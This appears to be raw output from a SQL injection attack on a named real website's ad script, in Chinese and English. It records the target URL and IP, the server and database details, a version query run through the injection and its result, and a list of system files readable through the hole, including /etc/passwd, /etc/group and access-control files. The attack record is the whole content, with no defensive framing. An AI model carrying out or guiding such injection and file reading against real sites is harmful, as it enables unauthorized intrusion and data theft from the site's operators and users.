Target:         http://ads.sina.com.hk/cgi-bin/format/view.cgi?id=20Host IP:        218.213.85.173Web Server: 	ApacheDB Server: 	MySQL >=4.1Current DB: 	ads
执行mysql命令:
Query: Select @@versionQuery result: 4.1.22-log
可读取的文件（linux）
/etc/sysconfig/i18n/etc/passwd/etc/group/etc/profile/etc/bashrc/etc/shells/etc/inittab/etc/rc.d/rc.local/etc/fstab/etc/protocols 协议/etc/services/etc/hosts 主机名/etc/sysconfig/network/etc/aliases/etc/pam.d/su 限制用户使用su/etc/hosts.allow/etc/issue/etc/login.defs/etc/logrotate.conf/etc/sysctl.conf
